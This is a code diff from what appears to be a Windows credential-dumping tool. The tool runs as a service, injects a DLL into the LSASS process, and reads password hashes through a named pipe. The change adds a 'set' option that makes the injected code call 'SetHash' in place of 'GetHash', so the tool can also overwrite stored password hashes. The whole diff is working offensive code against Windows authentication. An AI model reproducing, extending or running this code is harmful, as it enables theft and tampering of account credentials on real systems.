@@ -231,7 +231,7 @@ ULONG GetLsassPid()
     return ret;
 }
 
-void InjectDll(HANDLE hProc, char* szDllPath, LPCTSTR lpszPipeName, BYTE* pEncryptionKey, DWORD dwKeyLen, BOOL bSkipHistories)
+void InjectDll(HANDLE hProc, bool setPasswordHash, char* szDllPath, LPCTSTR lpszPipeName, BYTE* pEncryptionKey, DWORD dwKeyLen, BOOL bSkipHistories)
 {
     SIZE_T sizetFuncSize;
     SIZE_T sizetBytesToAlloc;
@@ -259,7 +259,11 @@ void InjectDll(HANDLE hProc, char* szDllPath, LPCTSTR lpszPipeName, BYTE* pEncry
 	strncpy(rtData.szPipeName, lpszPipeName, 50);
 
 	strncpy(rtData.szDllName, szDllPath, sizeof(rtData.szDllName));
-    strncpy(rtData.szFuncName, "GetHash", sizeof(rtData.szFuncName));
+	if (setPasswordHash) {
+		strncpy(rtData.szFuncName, "SetHash", sizeof(rtData.szFuncName));
+	} else {
+		strncpy(rtData.szFuncName, "GetHash", sizeof(rtData.szFuncName));
+	}
 
 	// Dictate if we are skipping password histories
 	rtData.bSkipHistories = bSkipHistories;
@@ -352,6 +356,11 @@ void __stdcall PWServMain(int argc, char* argv[])
 	DWORD dwKeyLen = *(argv[3]);
 	BOOL bSkipHistories = *(argv[4]);
 	char* szDllName = argv[6];
+	bool setPasswordHash = false;
+	if (!strcmp("set", argv[7])) {
+		setPasswordHash = true;
+	}
+
 
     hSrv = RegisterServiceCtrlHandler(srvName, (LPHANDLER_FUNCTION)PWServHandler);
     if(hSrv == NULL) 
@@ -381,7 +390,7 @@ void __stdcall PWServMain(int argc, char* argv[])
     TellSCM(SERVICE_RUNNING, 0, 0);
 
     // Inject the dll
-    InjectDll(hLsassProc, szDllName, szPipeName, pEncryptionKey, dwKeyLen, bSkipHistories);
+    InjectDll(hLsassProc, setPasswordHash, szDllName, szPipeName, pEncryptionKey, dwKeyLen, bSkipHistories);
 
 exit:
     TellSCM(SERVICE_STOP_PENDING, 0, 0);
